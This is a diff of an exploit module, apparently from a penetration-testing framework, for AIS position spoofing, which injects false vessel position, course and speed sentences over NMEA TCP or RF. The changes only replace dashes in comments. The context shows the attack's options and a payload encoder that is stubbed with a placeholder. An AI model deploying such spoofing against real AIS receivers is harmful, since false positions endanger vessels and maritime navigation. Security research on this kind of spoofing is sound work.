@@ -2,7 +2,7 @@
 
 Generates crafted AIS (Automatic Identification System) VDM sentences to
 broadcast false vessel position, course, and speed to AIS receivers.
-AIS (ITU-R M.1371) has no authentication — any transmitter can inject.
+AIS (ITU-R M.1371) has no authentication  -  any transmitter can inject.
 
 Original research / PoC credits
 --------------------------------
@@ -33,7 +33,7 @@ def _nmea_checksum(sentence: str) -> str:
 
 def _encode_ais_payload(mmsi: int, lat: float, lon: float, sog: float, cog: float) -> str:
     """Encode a minimal AIS Type 1 (Class A position report) payload."""
-    # Simplified encoding — real AIS uses 6-bit ASCII
+    # Simplified encoding  -  real AIS uses 6-bit ASCII
     msg_type = 1
     mmsi_bits = mmsi & 0x1FFFFFFF
     lat_int = int(lat * 600000) & 0xFFFFFFF
@@ -44,7 +44,7 @@ def _encode_ais_payload(mmsi: int, lat: float, lon: float, sog: float, cog: floa
     raw = (
         (msg_type << 26) | (0 << 22) | (0 << 8) | 0
     )
-    # Return placeholder — full encoding requires 168-bit bitfield
+    # Return placeholder  -  full encoding requires 168-bit bitfield
     return "15M67N0000G?f`LK@N2MhP0<08"  # Canonical AIS example payload
 
 
@@ -54,7 +54,7 @@ def _build_vdm(payload: str) -> str:
 
 
 class Exploit(Exploit):
-    """AIS Position Spoofing — inject false vessel position."""
+    """AIS Position Spoofing  -  inject false vessel position."""
 
     __info__ = {
         "name": "AIS Position Spoofing (NMEA VDM injection)",
@@ -79,7 +79,7 @@ class Exploit(Exploit):
     cog = OptString("0.0", "Course over ground in degrees")
     target = OptIP("", "NMEA TCP multiplexer IP (or empty for RF mode)")
     port = OptPort(10110, "NMEA TCP port")
-    dry_run = OptBool(True, "Dry run — show sentence only")
+    dry_run = OptBool(True, "Dry run  -  show sentence only")
 
     @mute
     def check(self) -> bool:
